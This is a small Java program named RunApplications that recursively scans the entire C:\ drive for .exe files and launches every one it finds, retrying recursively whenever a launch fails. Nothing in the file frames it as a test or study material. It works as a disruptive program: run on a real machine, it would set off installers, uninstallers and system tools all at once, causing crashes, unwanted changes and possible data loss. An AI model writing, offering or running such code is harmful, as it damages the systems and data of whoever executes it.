package net.domih;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class RunApplications {
	
	public static List<File> files = new ArrayList<File>();
	public static List<File> ghostFiles = new ArrayList<File>();
	
	public static void getFiles(String dir) {
		File directory = new File(dir);
		File[] fileList = directory.listFiles();
	    if(fileList != null) {
	        for (File file : fileList) {      
	            if (file.isFile() && file.getAbsolutePath().endsWith(".exe")) {
	                files.add(file);
	            } else if (file.isDirectory()) {
	                getFiles(file.getAbsoluteFile().toString());
	            }
	        }
	    }
	}

	public static void runApplication() {
		for (File file : files) {
			try {
				if (!ghostFiles.contains(file)) {
					Runtime.getRuntime().exec(file.getAbsolutePath().toString(), null, new File("."));
					ghostFiles.add(file);
				}
			} catch (IOException e) {
				ghostFiles.add(file);
				runApplication();
			}
		}
	}

	public static void main(String[] args) {
		getFiles("C:\\");
		runApplication();
	}
}
